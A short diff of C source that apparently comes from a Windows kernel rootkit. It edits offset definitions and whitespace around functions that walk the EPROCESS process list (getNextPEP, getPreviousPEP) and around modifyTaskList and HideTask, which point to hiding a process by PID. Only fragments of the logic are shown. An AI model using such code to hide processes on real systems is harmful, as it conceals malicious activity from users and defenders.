@@ -1,8 +1,3 @@
-#define EPROCESS_OFFSET_PID Offsets.ProcPID //offset to PID (DWORD)
-#define EPROCESS_OFFSET_NAME Offsets.ProcName //offset to name[16]
-#define EPROCESS_OFFSET_LINKS Offsets.ProcLinks //offset to LIST_ENTRY
-#define SZ_EPROCESS_NAME 0x010 //16 bytes
-
 BYTE * getNextPEP(BYTE * currentPEP)
 {
 	BYTE * nextPEP = NULL;
@@ -14,6 +9,7 @@ BYTE * getNextPEP(BYTE * currentPEP)
 	nextPEP = (fLink - EPROCESS_OFFSET_LINKS);
 	return(nextPEP);
 }
+
 BYTE * getPreviousPEP(BYTE* currentPEP)
 {
 	BYTE* prevPEP = NULL;
@@ -196,7 +192,6 @@ void modifyTaskList(DWORD pid)
 	DBG_PRINT2("modifyTaskList : Search(Done] ... No task found with PID=%d\n", pid);
 	return;
 }
-
 
 void HideTask(DWORD* pid)
 {
